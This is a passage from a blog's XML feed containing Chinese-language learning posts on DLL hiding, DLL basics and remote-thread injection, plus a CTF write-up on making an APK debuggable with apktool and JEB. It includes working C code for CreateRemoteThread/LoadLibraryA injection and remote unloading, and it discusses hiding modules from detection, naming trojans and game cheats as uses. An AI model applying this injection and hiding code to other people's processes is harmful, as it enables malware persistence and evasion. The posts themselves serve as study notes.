class="line"><span class="comment">//若字符串指定了一个相对路径或者无路径的模块名称，则函数使用标准搜索策略来查找模块。</span></span><br><span class="line"><span class="comment">//（…）</span></span><br><span class="line"><span class="comment">//若函数无法找到模块，则函数执行失败。当指定路径时，必须使用反斜线（\）而不是斜线（/）。</span></span><br><span class="line"><span class="comment">//（…）</span></span><br><span class="line"><span class="comment">//如果字符串指定了一个无路径的模块名称并且无文件名后缀，则函数默认在模块名称后面添加库文件后缀.dll。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DLL基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL隐藏初探</title>
      <link href="/posts/9677dc3d.html"/>
      <url>/posts/9677dc3d.html</url>
      
        <content type="html"><![CDATA[<h1>DLL隐藏</h1><p>属于是看着别人的文章，用着别人的工具在这儿玩儿得不亦乐乎了。</p><h2 id="1-何为DLL？">1.何为DLL？</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">动态链接库英文为DLL，是<span class="keyword">Dynamic</span> Link <span class="keyword">Library</span>的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32.dll 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于避免代码重用和促进内存的有效使用。</span><br><span class="line">通过使用 DLL，程序可以实现模块化，由相对独立的组件组成。例如，一个计帐程序可以按模块来销售。可以在运行时将各个模块加载到主程序中（如果安装了相应模块）。因为模块是彼此独立的，所以程序的加载速度更快，而且模块只在相应的功能被请求时才加载。</span><br></pre></td></tr></table></figure><p>​总而言之就是<strong>DLL</strong>这种技术可以使得程序模块化，同时让程序加载速度更快。</p><p><strong>详细解释见下面的链接：</strong></p><p>​<a href="https://encyclopedia.thefreedictionary.com/Dynamic-link+library">https://encyclopedia.thefreedictionary.com/Dynamic-link+library</a></p><h2 id="2-为啥要隐藏DLL？">2.为啥要隐藏DLL？</h2><p>​一句话总结：没做啥坏事，干嘛隐藏自己呢？所以隐藏了自己，那有很大的可能性是要做坏事：</p><p>​1.木马以DLL形式<strong>注入</strong>进正常进程并隐藏自己，导致无法追踪溯源，如键盘记录木马，感染型木马</p><p>​2.游戏外挂通过该种方式躲避游戏自身的“模块检测”，如DXF的第三方木马检测</p><p>​除了坏事儿之外，在一些常见的攻防对抗中，如若用到windows木马，不仅要注意免杀工作，有时也需要通过该技术实现持久性隐藏攻击。</p><h2 id="3-DLL隐藏常见手法">3.DLL隐藏常见手法</h2><p>​一.手动载入</p><p>​所谓手动载入就是自己去实现LoadLibrary函数，从理论上讲，这种方法隐藏效果是最棒的，但是实现一个基本的PEloader并不是一件容易的事情，如果还要考虑兼容性完美，就必须还得妥善处理TLS，资源，线程等问题。（不太易上手）</p><p>​二.痕迹消除</p><p>​这个就比较好说了，我们在注入DLL的时候，通常要选择去调用 LoadLibrary函数，然后再擦除痕迹，这样不用去处理那些TLS，资源，线程等为了解决兼容性产生的问题。但是Windows大家都清楚，表面风平浪静，背地里风起云涌，说不准现在你电脑的XXX安全卫士正在对你的电脑做些什么呢，这些都是你不通过技术手段看不到的东西，实际上没有什么好的方法把痕迹真正的消除。</p><p>​以DLL擦除痕迹为例，网上大多数的方法都是通过PEB双向断链，需要很多的硬编码，麻烦不说，通过内存暴力搜索还是会露出尾巴来</p><p>​攻防无绝对，攻防本身就是一个提升本身技术的过程，只要能够通过一个比较合适的方法，实现相应的功能，便具有可行性。</p><h2 id="4-DLL编写与注入测试">4.DLL编写与注入测试</h2><p>​一.DLL编写：</p><p>​①.于vs中创建一个空的项目。</p><p>​②.添加C语言代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hDll, DWORD dwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    DisableThreadLibraryCalls(hDll);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//================================== OPTIONAL =========================================</span></span><br><span class="line">        MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Message Test&quot;</span>,<span class="string">&quot;Message Title&quot;</span>, <span class="number">0</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​③.同时在项目属性中设置：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606170216727-295204846.png" alt="image-20231007111516385"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606170216426-1356352888.png" alt="image-20231007111556604"></p><p>​④.而后对文件进行编译生成即可。</p><p>​二.DLL注入测试：</p><p>​见演示。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606170521335-869227714.png" alt="image-20240606170519264"></p><p>由图可见进程中已经注入进入了我们的DLL，且内存地址为0x78EB0000</p><p>​三.手写代码实现注入</p><p>​谈完DLL编写和利用工具注入测试，我们来大致了解一下代码实现注入，方法有很多，但原理大致相同，我在这里以线程注入dll为例：</p><p>​代码编写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Inject</span><span class="params">(<span class="type">int</span> pID, <span class="type">char</span>* Path)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请一块内存给DLL路径</span></span><br><span class="line">    LPVOID pReturnAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(Path) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入路径到上一行代码申请的内存中</span></span><br><span class="line">    WriteProcessMemory(hProcess, pReturnAddress, Path, <span class="built_in">strlen</span>(Path) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取LoadLibraryA函数的地址</span></span><br><span class="line">    HMODULE hModule = LoadLibrary(<span class="string">&quot;KERNEL32.DLL&quot;</span>);</span><br><span class="line">    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建远程线程-并获取线程的句柄</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, lpStartAddress, pReturnAddress, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待线程事件</span></span><br><span class="line">    WaitForSingleObject(hThread, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//防止内存泄露</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//传dll路径</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* a = <span class="string">&quot;（传入dll所在路径）&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//传入进程ID</span></span><br><span class="line">    Inject(传入进程id, (<span class="type">char</span>*)a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码解析：</p><p>​首先，通过调用<code>OpenProcess</code>函数获取目标进程的句柄（<code>hProcess</code>）。<code>OpenProcess</code>函数使用了<code>PROCESS_ALL_ACCESS</code>参数，表示打开进程时拥有最高权限。然后，通过<code>VirtualAllocEx</code>函数在目标进程中申请一块内存（<code>pReturnAddress</code>），用于存储DLL文件路径。接着，使用<code>WriteProcessMemory</code>函数将DLL文件路径写入到刚才申请的内存空间中。</p><p>之后，通过调用<code>LoadLibrary</code>函数加载<code>KERNEL32.DLL</code>库，并使用<code>GetProcAddress</code>函数获取<code>LoadLibraryA</code>函数的地址（<code>lpStartAddress</code>）。</p><p>接下来，使用<code>CreateRemoteThread</code>函数在目标进程中创建一个远程线程，该线程将在目标进程的上下文中执行<code>lpStartAddress</code>函数，并将<code>pReturnAddress</code>作为参数传递给它。这样，目标进程就会执行<code>LoadLibraryA</code>函数，将DLL文件路径作为参数加载到自己的地址空间中。</p><p>最后，通过调用<code>WaitForSingleObject</code>函数等待远程线程事件的发生，直到线程执行完毕或超时。</p><p>整个过程完成后，关闭线程和进程句柄，释放相关资源，避免内存泄漏。</p><p><strong>根据传入参数，记录我们要传入的数据</strong>：</p><p>进程ID：xxxx</p><p>路径：xxxxxx</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606170553966-2095223455.png" alt="image-20240606170551892"></p><p>​而后将两个参数写入到程序对应的位置当中去，生成exe后丢到虚拟机中即可实现dll注入（此步还未复现）</p><p>成功注入之后，应该会弹出信息框，通过分析源代码，我们总结了一下注入流程：</p><p>1.在别人的程序里开辟内存空间A</p><p>2.将 LoadLibrary 函数参数写入A</p><p>3.获取LoadLibrary函数地址</p><p>4.在别人的程序里远程执行 LoadLibrary实现加载外部DLL</p><p>由此可见 LoadLibrary很重要，这个玩意竟然实现了注入！</p>]]></content>
      
      
      <categories>
          
          <category> DLL基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL基础以及注入</title>
      <link href="/posts/69da4c1f.html"/>
      <url>/posts/69da4c1f.html</url>
      
        <content type="html"><![CDATA[<h1>DLL基础入门笔记</h1><p>​大一时候写的笔记吧好像是。。。现在回首一看简直就是一坨，放博客里记录一下鼠鼠的阴暗成长史吧。(喜)</p><h2 id="0x01">0x01</h2><h3 id="DLL（动态链接库）">DLL（动态链接库）</h3><p>1.一般步骤：将<strong>共享DLL文件</strong>感染掉，电脑啥的重启时，所有调用它的都会被感染掉。</p><p>2.注意事项：</p><p>​DLL模块中包含各种导出函数，用于向外界提供服务，exe。</p><p>​一个DLL在内存中只有一个实例。</p><p>​DLL实现了代码的封装性；<strong>编程-&gt;接口</strong></p><p>​DLL的编制与具体的编程语言及编译器无关。</p><p>​DLL模块需要的堆栈内存都是从运行进程的堆栈中分配出来的。</p><p>​DLL函数中的代码所创建的任何对象（包括变量）都归调用它的线程或进程所有。</p><h3 id="Windows-API基础速成">Windows API基础速成</h3><p>1.其中32位Windows操作系统的<strong>编程接口</strong>称为Win32 API</p><p>2.<strong>应用层</strong>编程都是32位的API  而<strong>内核层</strong>才会用到64位的</p><p>3.函数分类：</p><p>​基本服务（开关机）</p><p>​组件服务（打开任务管理器即可查看）</p><p>​用户界面服务（平时编辑的窗口）</p><p>​图形多媒体服务（听歌，看电影）</p><p>​消息和协作（发信息，复制，粘贴，剪贴等等）</p><p>​网络</p><p>​web服务（网页）</p><h3 id="通过系统文件函数的操作掌握学习方法">通过系统文件函数的操作掌握学习方法</h3><p>eg. DeleteFileA 是 DeleteFile的净化版本</p><p>1.可适当取用错误码的返回函数来判断程序的出错原因，对照官网api函数详解。</p><h3 id="DLL文件的编写速成">DLL文件的编写速成</h3><p>①.创建DLL</p><p>​调用约定：</p><p>​__stdcall（函数的调用约定 ）</p><p>​__cdel</p><p>②.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br></pre></td></tr></table></figure><p>​上面这则代码是<strong>核心的入口函数 DLL文件 动态链接库入口函数</strong></p><p>​DLL模块的句柄 handle</p><p>​DLLMain函数被调用的原因</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165736567-122197710.png" alt="image-20231022134247321"></p><p>​调用原因集合大全：</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165736758-1040601863.png" alt="image-20231022134447172"></p><p>​保留项，也就是Windows的保留参数  <strong>lpReserved</strong></p><p>​保留参数：不是不使用的参数，而是Windows不想让我们知 道作用的参数</p><p>​</p><h3 id="导出函数（相当于一个接口）">导出函数（相当于一个接口）</h3><p>1.DLL文件提供接口，前提是DLL文件中有<strong>导出函数</strong>了才能让外部程序实现对于DLL的调用</p><p>2.如果声明没有dllimport或dllexport特性的函数，则该函数不能视为DLL接口的一部分。</p><h3 id="应用程序与导出函数的静态通讯方法">应用程序与导出函数的静态通讯方法</h3><p>1.静态库是指在我们的应用中，有一些公共代码是需要反复使用，就把这些代码编译为“库”文件，链接器将从库文件取得所需代码，复制到生成的可执行文件中的这种库。</p><p>2.#pragma comment(lib , “dll”) 注意：没有分号 （函数参数是 后面那个）</p><p>​注意事项：</p><p>​extern “C” void 函数名（参数）；注意有分号   //防止编译后函数名被篡改或者粉碎</p><p>​__declspec(dllexport)：声明导出函数，将该函数从本DLL开放提供给其他应用程序使用</p><p>​如果没有声明DLLimport或dllexport特性的函数，则该函数不被视为DLL接口的一部分。因此，函数的定义必须存在于该模块或同一程序程序的另一个模块中。<strong>若要使函数成为DLL接口的一部分，必须将其他模块中的函数的定义声明为 dllexport</strong>。</p><p>​1.**编译的时候：**编译exe文件的时候必须将所注入的DLL文件复制到exe文件所在的解决方案目录中（如果不详写路径的话）</p><p>​2.**运行的时候：**不需要lib，只需要dll</p><p>复现成功！</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165736751-1982066149.png" alt="image-20231022144642025"></p><h2 id="0x02">0x02</h2><h3 id="一-应用程序与DLL导出函数的“动态”通讯：">一.应用程序与DLL导出函数的“动态”通讯：</h3><p>​静态调用：通过连接器将DLL函数的导出函数写进可执行文件。（见part1中的后面部分）</p><p>​动态调用：相对于前一种调用属于动态调用，不是在连接时完成的，而是在运行时候完成的。</p><h3 id="二-动态调用的核心代码：">二.动态调用的核心代码：</h3><p>此处只需要将原本静态调用下编写的dll文件与新编写的动态调用所生成的exe放在同一文件下即可</p><p>动态调用的详细改写代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PMessage_Box)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将指定模块</span></span><br><span class="line">HMODULE hModule = LoadLibrary(<span class="string">&quot;firstDll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断句柄是否为空</span></span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;句柄错误！&quot;</span>, <span class="string">&quot;标题：&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从指定的动态链接库（DLL）中检索出的函数 bbb 的地址</span></span><br><span class="line">PMessage_Box pMsg = (PMessage_Box)GetProcAddress(hModule, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行函数</span></span><br><span class="line">pMsg();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现截图如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165420498-783117456.png" alt="image-20231110195143567"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165420157-1189198010.png" alt="image-20231110202121768"></p><p>实现成功</p><h2 id="0x03">0x03</h2><h3 id="一-导出函数查看工具的使用：">一.导出函数查看工具的使用：</h3><p>​一键略过，说一下可记知识点：</p><p>​X86 -&gt; 32位</p><p>​X64 -&gt; 64位</p><p>​RVA：RVA是相对虚拟地址（Relative <a href="https://so.csdn.net/so/search?q=Virtual&amp;spm=1001.2101.3001.7020">Virtual</a> Address）的缩写，顾名思义，<strong>它是一个“相对”地址，也可以说是“偏移量”</strong>，PE文件的各种数据结构中涉及到地址的字段大部分都是以RVA表示的。</p><p>​主要就是查看dll中函数导出的RVA地址</p><h3 id="二-DLL注入工具使用">二.DLL注入工具使用</h3><p>​  使用注入工具的话需要对于原来的dll文件有一个修改</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606165619234-1927623490.png" alt="image-20231110211535157"></p><h3 id="三-进程和线程的概念：">三.进程和线程的概念：</h3><p>​1.进程，线程，CPU之间的关系就好像车间，车间资源，工厂之间的关系。</p><p>​2.操作系统的设计可以归结为三点：</p><p>​（1）.以多进程形式，允许多个任务同时运行；</p><p>​（2）.以多线程形式，允许单个任务分成不同的部分运行；</p><p>​（3）.提供协调机制，一方面防止进程之间和线程之间产生冲突，另一方面<strong>允许进程之间和线程之间共享资源。</strong></p><p>​3.远线程注入：创建一个远程的线程到目标的进程中去执行LoadLibraryA函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Inject</span><span class="params">(<span class="type">int</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回进程的句柄</span></span><br><span class="line">HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载kernel32.dll模块</span></span><br><span class="line">HMODULE hModule = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取 dll载入函数的地址</span></span><br><span class="line">LPTHREAD_START_ROUTINE lpStarAddress = (LPTHREAD_START_ROUTINE)GetProcAddress( hModule,<span class="string">&quot;LoadLibraayA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建远程线程</span></span><br><span class="line">CreateRemoteThread(ProcessHandle, <span class="literal">NULL</span>, <span class="number">0</span>, lpStarAddress, 内存地址, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​4.地址获取；</p><p>​5.模块擦除：</p><p>​在调用完一个dll之后，记得用FreeLibrary(“被调用模块的句柄”)擦除一下，如若要加载的应用中存在自动扫描dll，那么这个模块将会暴露，所以要擦除。</p><h3 id="四-远程卸载dll模块实战">四.远程卸载dll模块实战</h3><p>​废话不多说，直接上代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Unject</span><span class="params">(<span class="type">int</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回进程的句柄</span></span><br><span class="line">HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建远程线程  //FreeLibrary的地址//要卸载的目标dll地址</span></span><br><span class="line">HANDLE hThread = CreateRemoteThread(ProcessHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)<span class="number">0x76FC8E60</span>, (LPVOID)<span class="number">0x67B30000</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待线程事件,当调用这个函数时</span></span><br><span class="line"><span class="comment">// 当前线程会暂停执行，直到所指定的对象变为可用或者信号状态发生变化才会继续执行后面的代码</span></span><br><span class="line">WaitForSingleObject(hThread, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//防止内存泄露</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(ProcessHandle);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DLL基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次动调apk</title>
      <link href="/posts/96a6187.html"/>
      <url>/posts/96a6187.html</url>
      
        <content type="html"><![CDATA[<h1>记第一次动调apk</h1><p>是24XY里的一道题，就单纯一道简单的安卓题，主要考查的点就是动调apk，记录下来的原因是踩了不少坑，毕竟第一次JEB动调apk</p><h2 id="一-配置adb">一.配置adb</h2><p>​ADB 全称为 Android Debug Bridge，起到调试桥的作用，是一个<strong>客户端-服务器端程序</strong>。其中客户端是用来操作的电脑，服务端是 Android 设备。</p><p>下载链接：</p><p><code>Windows版本：https://dl.google.com/android/repository/platform-tools-latest-windows.zip</code><br><code>Mac版本：https://dl.google.com/android/repository/platform-tools-latest-windows.zip</code><br><code>Linux版本：https://dl.google.com/android/repository/platform-tools-latest-linux.zip</code></p><p>然后使用详解的话可以参考这篇博客<a href="https://blog.csdn.net/Python_0011/article/details/132040387">ADB安装及使用详解（非常详细）从零基础入门到精通，看完这一篇就够了-CSDN博客</a></p><h2 id="二-题点解析">二.题点解析</h2><p>​这道题主要就是考查配置起apk的调试状态，分为两个目标进行达成，一是修改AndroidManifest中debuggable属性，第二个是修改ro.debuggable属性，其中第二个可以在下面链接中查看进行修改，我主要说说第一个，修改AndroidManifest中debuggable属性。<a href="https://blog.csdn.net/qq_30496695/article/details/80425676">让apk变可调试_如何修改 允许调试 安卓 apk-CSDN博客</a></p><p>​想要修改AndroidManifest中debuggable属性，首先需要对你的apk进行解包，这里我使用的是ApkTool 进行解包和打包，下载链接是https://ibotpeaches.github.io/Apktool/，然后将apktool.jar放置在与你的apk同目录的文件夹下，同时你还需要一个签名的jar，用于将解包修改完之后的apk再重新签名一次，不然这个apk不能装载虚拟机上，这个文件可以去网上搜，再有就是用于签名的两个密钥文件，可以去下面这个文章弄<a href="https://blog.csdn.net/Memory64/article/details/134434739?ops_request_misc=%7B%22request%5Fid%22%3A%22171534160916800178586049%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171534160916800178586049&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-134434739-null-null.142%5Ev100%5Epc_search_result_base7&amp;utm_term=apk%E6%9B%B4%E6%94%B9%E7%AD%BE%E5%90%8D&amp;spm=1018.2226.3001.4187">APK重新签名或者更改签名详细步骤-CSDN博客</a>，最后支撑文件如下如所示：（demo是已解包之后的文件夹，777.apk是原apk重新打包的文件）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606164329476-263582952.png" alt="image-20240510234243171"></p><p>​拿到上述支撑文件就可以开始了</p><p>​解包命令：<code>java -jar apktool_2.9.3.jar d DebugMe.apk -o demo</code></p><p>​之后在包中找到AndroidManifest.xml并将android:debuggable=&quot;true&quot;添加进application中，下列示例代码的最后一行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- application标签加上android:debuggable=&quot;true&quot; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​然后再用打包命令：<code>java -jar apktool_2.9.3.jar b demo -o 777.apk</code>（注意java版本别用太低，之前卡了好久在这儿，最后换了个高一点的版本才打包成功）</p><p>​最后就是签名命令<code>jarsigner -verbose -keystore kkkey.jks -signedjar 777.apk 777.apk android.keystore</code>，用到了上文中提到的两个秘钥支撑文件</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606164329624-1456941277.png" alt="image-20240510235117269"></p><p>​签名成功，拖进虚拟机也安装成功，直接打开JEB开始动调！</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606164329613-2131913807.png" alt="image-20240511000110943"></p>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件架构学习(二)</title>
      <link href="/posts/9b07ff3f.html"/>
      <url>/posts/9b07ff3f.html</url>
      
